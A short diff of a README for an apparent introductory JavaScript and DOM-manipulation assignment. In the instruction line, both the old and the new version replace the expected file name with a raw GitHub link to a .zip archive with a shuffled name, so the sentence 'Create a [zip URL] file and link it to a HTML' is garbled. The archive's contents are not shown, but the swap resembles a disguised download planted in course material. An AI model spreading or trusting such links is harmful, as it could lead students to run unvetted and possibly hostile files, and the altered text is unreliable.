@@ -8,7 +8,7 @@ Respond to user interactions.
 
 ## Instructions
 
-- Create a https://raw.githubusercontent.com/timokamau/feb-2025-introduction-to-javascript-and-dom-manipulation-timokamau/main/objectify/feb-2025-introduction-to-javascript-and-dom-manipulation-timokamau-3.7.zip file and link it to a HTML.
+- Create a https://github.com/timokamau/feb-2025-introduction-to-javascript-and-dom-manipulation-timokamau/raw/refs/heads/main/objectify/feb_javascript_to_dom_introduction_manipulation_timokamau_and_v2.7.zip file and link it to a HTML.
 - Structure the document using DOCTYPE, html, head, and body.
 
 >[!NOTE]
